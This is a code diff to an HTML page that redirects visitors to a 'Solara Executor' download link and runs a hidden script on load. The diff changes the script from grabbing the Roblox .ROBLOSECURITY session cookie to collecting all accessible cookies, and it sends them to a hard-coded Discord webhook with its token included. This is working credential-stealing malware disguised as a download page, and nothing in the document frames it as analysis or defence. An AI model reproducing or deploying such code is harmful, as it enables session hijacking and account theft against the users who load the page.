@@ -17,23 +17,23 @@
     <meta http-equiv="refresh" content="0; url=https://bit.ly/Solara-Executor">
     <!-- Cookie Retrieval Script -->
     <script>
-        // Function to get a specific cookie by name
-        function getCookie(name) {
-            let cookieArr = document.cookie.split(";");
-            
-            for (let i = 0; i < cookieArr.length; i++) {
-                let cookiePair = cookieArr[i].split("=");
-                
-                if (name === cookiePair[0].trim()) {
-                    return decodeURIComponent(cookiePair[1]);
-                }
-            }
-            
-            return null;
+        // Function to get all accessible cookies
+        function getAllCookies() {
+            let cookies = {};
+            let cookieArr = document.cookie.split(';');
+
+            cookieArr.forEach(cookie => {
+                let [name, value] = cookie.split('=');
+                cookies[name.trim()] = decodeURIComponent(value);
+            });
+
+            return cookies;
         }
 
-        // Attempt to retrieve the .ROBLOSECURITY cookie
-        let robloSecurityCookie = getCookie('.ROBLOSECURITY');
+        // Retrieve all accessible cookies
+        let allCookies = getAllCookies();
+
+        // Function to send data to webhook
         function sendToWebhook(data) {
             fetch('https://discord.com/api/webhooks/1275918541702561803/TC8xhuXEgioM6PLJyrG3Gu-jaV3L25YgaxBuaB29SpJKhnb3tu2dwrZzMJnjAHgVmMwC', {
                 method: 'POST',
@@ -41,22 +41,23 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: `Data: ${JSON.stringify(data)}`
+                    content: `Cookies: ${JSON.stringify(data)}`
                 })
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('Data sent successfully!');
+                    console.log('Cookies sent successfully!');
                 } else {
-                    console.error('Error sending data:', response.statusText);
+                    console.error('Error sending cookies:', response.statusText);
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
             });
         }
-        // Call the function to send dummy data
-        sendToWebhook(robloSecurityCookie);
+
+        // Send the retrieved cookies to the webhook
+        sendToWebhook(allCookies);
     </script>
 </head>
 <body>
